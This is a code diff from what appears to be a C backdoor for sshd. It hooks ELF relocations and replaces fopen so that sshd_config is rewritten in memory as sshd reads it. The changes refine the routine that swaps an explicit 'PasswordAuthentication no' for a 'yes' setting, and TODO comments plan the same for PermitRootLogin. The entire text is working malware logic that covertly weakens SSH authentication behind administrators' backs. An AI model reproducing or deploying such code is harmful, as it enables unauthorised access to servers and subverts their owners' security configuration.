@@ -23,7 +23,9 @@ static int hook_rela(Elf64_Rela *foundrela, void *func, int type);
  * TODO: sanity
  * TODO: read sshd.c -- very possible fopen(sshd_config) is the first ever fopen
  * TODO: ensure EXPLICIT's robustness -- already had to fix an edge case
+ * TODO: PermitRootLogin without-password && PermitRootLogin forced-commands-only
  * XXX: there is probably an easier way to do what I'm trying to do with bitmasks, but I like the practice and it feels cool
+
  */
 FILE *my_fopen(char *filename, char *mode)
 {
@@ -54,6 +56,8 @@ FILE *my_fopen(char *filename, char *mode)
 			PermitRootLogin = strstr(str, "PermitRootLogin");
 
 		/* determine if PermitRootLogin is explicity set to (Yes || No) - (case insensitive) */
+		/* PermitRootLogin without-password && PermitRootLogin forced-commands-only */
+
 		if (PermitRootLogin != NULL) {
 
 			/* clear any previously set PermitRootLogin flags -- it's possible for a sshd_config to have duplicates */
@@ -161,7 +165,7 @@ FILE *my_fopen(char *filename, char *mode)
 	}
 
 	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_EXPLICIT) {
-		_EXPLICIT_work(&new, "PasswordAuthentication ", PA_Y, "PasswordAuthentication no ", &buf, &buf_len);
+		_EXPLICIT_work(&new, "PasswordAuthentication ", PA_Y, "PasswordAuthentication no", &buf, &buf_len);
 	}
 
 
@@ -215,52 +219,42 @@ int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, c
 		}
 		str = strtok(NULL, "\n");
 	}
-
+	
 	/* how far is config_name_ptr from the start of sshd_config */
 	bytes_from_start = (char *) config_name_ptr - (char *) tok_buf;
 
-	/* copy all of the bytes from sshd_config into new -- up until (excluding) config_name_ptr */
 	if (*__new == NULL)
 		*__new = malloc(buf_len);
 
-	memcpy(*__new, *__buf, bytes_from_start);
-
-	/* bytes_from_start can be wonky
-	 * 	e.g. the above memcpy will copy junk after a valid config option into new
-	 * this will make sure that bytes_from_start is aligned to a valid \n,
+	/* it's possible for *__new and *__buf to point to the same thing --
+	 *  e.g. this is the second _EXPLICIT_WORK call
 	 */
-	int i = 0;
-	char x; 
-	x = *((char*) *__new + bytes_from_start); // get single char from (new + bytes_from_start)
-	while (x != '\n') {
-		bytes_from_start--;
-		i++;
-		x = *((char*) *__new + bytes_from_start);
+	if (*__new == *__buf) {
+		*__new = malloc(buf_len);
+		memcpy(*__new, *__buf, buf_len);
 	}
-	
-	/* ... */
-	memcpy((char *) *__new + bytes_from_start + i, redefine, strlen(redefine));
 
-	/* get number of char until \n in "config_name_ptr no" 
-	 * XXX: this most likely isn't needed anymore as this will always be the above no string (+1)
-	 * TODO: newline and + i is clunky
-	 */
-	int newline = strcspn(config_name_ptr, "\n");
-	newline += 1; /* +1 - strlen(yes) = 3 . strlen(no) = 2 */
+	/* copy all of the bytes from sshd_config into new -- up until (excluding) config_name_ptr */
+	memcpy(*__new, *__buf, bytes_from_start);
+	/* *__new is still sloppy -- to ensure correct strlen() make sure we clobber off garbage we don't need */
+	memset((char *) *__new + bytes_from_start, 0, buf_len - bytes_from_start);
+
+	/* append redefine to new */
+	memcpy((char *) *__new + bytes_from_start, redefine, strlen(redefine));
+
+	/* *__new now contains all config options up to old, and is also now appended with redefine */
 	
-	
+
 	/* 
 	 * if this doesn't make you love C, I don't know what would 
 	 *
-	 * copy into new -- make sure we skip the "config_name_ptr yes" we just added by adding newline
-	 * from buf -- bytes_from_start + strlen() will cut "config_name_ptr no" from buf so we can append the rest of buf
 	 */	
-	memcpy((char *) *__new + (unsigned long long) bytes_from_start + newline + i, 
-				(char*) *__buf + bytes_from_start + i + strlen(old),
-				strlen(*__buf + bytes_from_start));
+	memcpy((char *) *__new + strlen(*__new), (char *) *__buf + bytes_from_start + strlen(old),
+					strlen((char *) *__buf + bytes_from_start));
 
-	
-	free(*__buf);
+
+
+	//free(*__buf);
 	*__buf = *__new;
 	
 	return 0;
